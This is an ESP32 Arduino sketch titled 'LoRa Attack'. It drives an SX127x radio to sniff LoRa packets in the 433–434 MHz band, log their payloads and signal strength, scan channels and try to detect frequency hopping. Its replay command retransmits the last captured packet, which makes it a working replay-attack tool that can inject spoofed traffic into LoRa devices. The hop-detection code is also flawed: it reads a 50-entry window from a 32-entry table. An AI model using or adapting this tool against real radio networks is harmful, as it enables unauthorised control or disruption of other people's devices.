// H14 — LoRa Attack (ESP32)
// LoRa packet sniffing, replay, frequency hopping detection
// Uses SX1276/SX1278 via LoRa library (SPI)

#include <Arduino.h>
#include <SPI.h>
#include <LoRa.h>

// ── Configuration ──────────────────────────────────────────────
#define LORA_CS_PIN      5
#define LORA_RST_PIN     14
#define LORA_IRQ_PIN     2
#define LORA_SCK_PIN     18
#define LORA_MOSI_PIN    23
#define LORA_MISO_PIN    19
#define SERIAL_BAUD      115200

#define FREQ_MIN_MHZ     433.0
#define FREQ_MAX_MHZ     434.0
#define FREQ_STEP_MHZ    0.1
#define DEFAULT_FREQ     433.0
#define DEFAULT_BW       125000
#define DEFAULT_SF       7
#define DEFAULT_CR       5
#define PACKET_LOG_SIZE  64

// ── Frequency hopping detection ──────────────────────────────
#define HOP_TABLE_SIZE   32
#define HOPWindowSize    50

struct HopEntry {
  float freq;
  uint32_t timestamp;
};

HopEntry hopTable[HOP_TABLE_SIZE];
int hopCount = 0;

// ── Captured packets ─────────────────────────────────────────
struct CapturedPacket {
  float    freq;
  int      rssi;
  float    snr;
  uint8_t  data[255];
  int      len;
  uint32_t timestamp;
};
CapturedPacket packetLog[PACKET_LOG_SIZE];
int packetLogIdx = 0;
int packetLogCount = 0;
float currentFreq = DEFAULT_FREQ;

// ── Forward declarations ──────────────────────────────────────
void    initLora(float freq);
void    sniffLoop();
void    handlePacket(int packetSize);
void    replayLastPacket();
void    scanFrequencies();
void    detectFrequencyHopping();
void    printPacket(int idx);
void    printStats();
bool    isLikelyFHSS();

// ── Setup ─────────────────────────────────────────────────────
void setup() {
  Serial.begin(SERIAL_BAUD);
  delay(500);
  Serial.println(F("\n=== H14 — LoRa Attack ==="));

  SPI.begin(LORA_SCK_PIN, LORA_MISO_PIN, LORA_MOSI_PIN, LORA_CS_PIN);
  initLora(DEFAULT_FREQ);

  Serial.println(F("Commands:"));
  Serial.println(F("  r = Replay last packet"));
  Serial.println(F("  s = Scan all frequencies"));
  Serial.println(F("  f = Detect frequency hopping"));
  Serial.println(F("  p = Print packet log"));
  Serial.println(F("  t = Print statistics"));
  Serial.printf("  +/– = Change frequency (current: %.1f MHz)\n", (float)DEFAULT_FREQ);
  Serial.println();
}

// ── Main loop ─────────────────────────────────────────────────
void loop() {
  // Serial commands
  if (Serial.available()) {
    char c = Serial.read();
    switch (c) {
      case 'r': case 'R': replayLastPacket(); break;
      case 's': case 'S': scanFrequencies(); break;
      case 'f': case 'F': detectFrequencyHopping(); break;
      case 'p': case 'P':
        for (int i = 0; i < packetLogCount; i++) printPacket(i);
        break;
      case 't': case 'T': printStats(); break;
      case '+': case '=': {
        float newFreq = currentFreq + FREQ_STEP_MHZ;
        if (newFreq <= FREQ_MAX_MHZ) {
          LoRa.setFrequency(newFreq);
          currentFreq = newFreq;
          Serial.printf("Freq: %.1f MHz\n", newFreq);
        }
        break;
      }
      case '-': case '_': {
        float newFreq = currentFreq - FREQ_STEP_MHZ;
        if (newFreq >= FREQ_MIN_MHZ) {
          LoRa.setFrequency(newFreq);
          currentFreq = newFreq;
          Serial.printf("Freq: %.1f MHz\n", newFreq);
        }
        break;
      }
    }
  }

  // Listen for packets
  sniffLoop();
}

// ── Initialize LoRa ──────────────────────────────────────────
void initLora(float freq) {
  LoRa.setPins(LORA_CS_PIN, LORA_RST_PIN, LORA_IRQ_PIN);

  if (!LoRa.begin((long)(freq * 1E6))) {
    Serial.println("[ERR] LoRa init failed!");
    while (1) delay(1000);
  }

  LoRa.setSpreadingFactor(DEFAULT_SF);
  LoRa.setSignalBandwidth(DEFAULT_BW);
  LoRa.setCodingRate4(DEFAULT_CR);
  LoRa.enableCrc();
  LoRa.setSyncWord(0x12);

  Serial.printf("LoRa on %.1f MHz, BW=%d, SF=%d, CR=4/%d\n",
    freq, DEFAULT_BW, DEFAULT_SF, DEFAULT_CR);
  currentFreq = freq;
}

// ── Sniff loop ───────────────────────────────────────────────
void sniffLoop() {
  int packetSize = LoRa.parsePacket();
  if (packetSize > 0) {
    handlePacket(packetSize);
  }
}

// ── Handle received packet ───────────────────────────────────
void handlePacket(int packetSize) {
  int idx = packetLogIdx;
  packetLog[idx].freq      = currentFreq;
  packetLog[idx].rssi      = LoRa.packetRssi();
  packetLog[idx].snr       = LoRa.packetSnr();
  packetLog[idx].len       = 0;
  packetLog[idx].timestamp = millis();

  while (LoRa.available() && packetLog[idx].len < 255) {
    packetLog[idx].data[packetLog[idx].len++] = LoRa.read();
  }

  packetLogIdx = (packetLogIdx + 1) % PACKET_LOG_SIZE;
  if (packetLogCount < PACKET_LOG_SIZE) packetLogCount++;

  // Add to hop table
  hopTable[hopCount % HOP_TABLE_SIZE].freq = packetLog[idx].freq;
  hopTable[hopCount % HOP_TABLE_SIZE].timestamp = millis();
  hopCount++;

  // Print summary
  Serial.printf("[PKT] Freq=%.1f RSSI=%d SNR=%.1f Len=%d Data=",
    packetLog[idx].freq, packetLog[idx].rssi, packetLog[idx].snr, packetLog[idx].len);
  for (int i = 0; i < min(packetLog[idx].len, 32); i++) {
    Serial.printf("%02X ", packetLog[idx].data[i]);
  }
  Serial.println();
}

// ── Replay last packet ──────────────────────────────────────
void replayLastPacket() {
  if (packetLogCount == 0) {
    Serial.println("[ERR] No packets to replay");
    return;
  }

  int lastIdx = (packetLogIdx - 1 + PACKET_LOG_SIZE) % PACKET_LOG_SIZE;
  CapturedPacket& p = packetLog[lastIdx];

  Serial.printf("[REPLAY] %.1f MHz, %d bytes\n", p.freq, p.len);

  LoRa.setFrequency(p.freq);
  LoRa.beginPacket();
  LoRa.write(p.data, p.len);
  LoRa.endPacket();

  Serial.println("[REPLAY] Sent.");

  // Return to sniff
  LoRa.setFrequency(DEFAULT_FREQ);
  currentFreq = DEFAULT_FREQ;
}

// ── Scan frequencies ─────────────────────────────────────────
void scanFrequencies() {
  Serial.println("[SCAN] Scanning frequency range...");

  for (float f = FREQ_MIN_MHZ; f <= FREQ_MAX_MHZ; f += FREQ_STEP_MHZ) {
    LoRa.setFrequency(f);
    delay(100);

    int rssi = LoRa.random();
    int hits = 0;
    uint32_t start = millis();

    while (millis() - start < 200) {
      if (LoRa.parsePacket() > 0) {
        hits++;
        while (LoRa.available()) LoRa.read();
      }
    }

    if (hits > 0) {
      Serial.printf("  %.1f MHz: %d packets\n", f, hits);
    }
  }

  Serial.println("[SCAN] Complete.");
  LoRa.setFrequency(DEFAULT_FREQ);
  currentFreq = DEFAULT_FREQ;
}

// ── Detect frequency hopping ─────────────────────────────────
void detectFrequencyHopping() {
  Serial.println("[FHOP] Analyzing hop pattern...");

  if (hopCount < 4) {
    Serial.println("[FHOP] Not enough data (need >= 4 packets)");
    return;
  }

  float freqs[HOPWindowSize];
  uint32_t times[HOPWindowSize];
  int count = min(hopCount, HOPWindowSize);

  for (int i = 0; i < count; i++) {
    int idx = (hopCount - count + i) % HOP_TABLE_SIZE;
    freqs[i] = hopTable[idx].freq;
    times[i] = hopTable[idx].timestamp;
  }

  // Count unique frequencies
  float unique[HOPWindowSize];
  int uniqueCount = 0;
  for (int i = 0; i < count; i++) {
    bool found = false;
    for (int j = 0; j < uniqueCount; j++) {
      if (abs(freqs[i] - unique[j]) < 0.05) { found = true; break; }
    }
    if (!found) unique[uniqueCount++] = freqs[i];
  }

  Serial.printf("  Unique frequencies: %d\n", uniqueCount);
  for (int i = 0; i < uniqueCount; i++) {
    Serial.printf("    %.1f MHz\n", unique[i]);
  }

  if (uniqueCount > 2) {
    // Estimate hop interval
    uint32_t totalDelta = times[count - 1] - times[0];
    float avgInterval = (float)totalDelta / (count - 1);
    Serial.printf("  Estimated hop interval: %.0f ms\n", avgInterval);
    Serial.println("  → Likely FHSS detected");
  } else {
    Serial.println("  → Single/few frequencies (no FHSS)");
  }
}

// ── Print packet ─────────────────────────────────────────────
void printPacket(int idx) {
  CapturedPacket& p = packetLog[idx];
  Serial.printf("[#%d] %.1f MHz RSSI=%d SNR=%.1f %d bytes: ",
    idx, p.freq, p.rssi, p.snr, p.len);
  for (int i = 0; i < min(p.len, 32); i++) {
    Serial.printf("%02X ", p.data[i]);
  }
  if (p.len > 32) Serial.print("...");
  Serial.println();
}

// ── Statistics ───────────────────────────────────────────────
void printStats() {
  Serial.printf("\n── LoRa Attack Stats ──\n");
  Serial.printf("Frequency:  %.1f MHz\n", currentFreq);
  Serial.printf("Bandwidth:  %d Hz\n", DEFAULT_BW);
  Serial.printf("Spreading:  SF%d\n", DEFAULT_SF);
  Serial.printf("Coding:     4/%d\n", DEFAULT_CR);
  Serial.printf("Packets:    %d\n", packetLogCount);
  Serial.printf("Hops seen:  %d\n", hopCount);
  if (packetLogCount > 0) {
    int lastIdx = (packetLogIdx - 1 + PACKET_LOG_SIZE) % PACKET_LOG_SIZE;
    Serial.printf("Last RSSI:  %d dBm\n", packetLog[lastIdx].rssi);
    Serial.printf("Last SNR:   %.1f dB\n", packetLog[lastIdx].snr);
  }
  Serial.println();
}
